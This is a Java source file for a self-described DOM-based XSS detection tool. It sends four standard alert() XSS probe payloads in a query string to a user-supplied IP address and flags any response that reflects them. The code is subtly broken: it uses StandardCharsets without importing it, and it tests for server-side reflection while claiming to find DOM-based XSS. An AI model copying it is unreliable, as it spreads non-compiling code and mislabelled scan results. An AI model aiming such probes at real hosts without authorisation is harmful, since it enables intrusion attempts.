import java.io.*;
import java.net.*;
import java.util.*;

public class DOMBasedXSSDetector {

    // Function to detect DOM-Based XSS by injecting payloads
    public static void detectDOMBasedXSS(String ipAddress) {
        System.out.println("Checking for potential DOM-Based XSS on " + ipAddress + "...\n");

        // List of common XSS payloads
        String[] payloads = {
            "<script>alert('XSS')</script>",  // Basic script payload
            "<img src=x onerror=alert('XSS')>",  // Image with onerror event
            "<svg onload=alert('XSS')></svg>",  // SVG with onload event
            "<a href='javascript:alert(1)'>Click me</a>",  // JavaScript URL payload
        };

        // Base URL for testing (e.g., adjust to test specific pages like login, search, etc.)
        String baseUrl = "http://" + ipAddress + "/";  // Modify this as needed

        for (String payload : payloads) {
            // Construct the test URL by appending payload to the query string
            String testUrl = baseUrl + "?q=" + URLEncoder.encode(payload, StandardCharsets.UTF_8);

            try {
                // Create a URL object
                URL url = new URL(testUrl);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("GET");
                connection.setDoOutput(true);

                // Get the response code and body
                int responseCode = connection.getResponseCode();
                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String inputLine;
                StringBuilder response = new StringBuilder();
                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                in.close();

                // Check for the presence of the payload in the response
                if (response.toString().contains(payload)) {
                    System.out.println("[!] Potential DOM-Based XSS detected with payload: " + payload);
                    System.out.println("Response contains injected payload: " + payload);
                } else {
                    System.out.println("[+] No DOM-Based XSS detected with payload: " + payload);
                }

            } catch (IOException e) {
                System.out.println("[!] Error making request: " + e.getMessage());
            }
        }
    }

    // Main function to prompt the user and start the detection process
    public static void main(String[] args) {
        System.out.println("==================== DOM-Based XSS Detection Tool ==================== ");

        // Prompt the user for an IP address to test for DOM-Based XSS
        Scanner scanner = new Scanner(System.in);
        System.out.print("Enter the target IP address:");
        String ipAddress = scanner.nextLine();

        // Start detecting DOM-Based XSS
        detectDOMBasedXSS(ipAddress);
    }
}
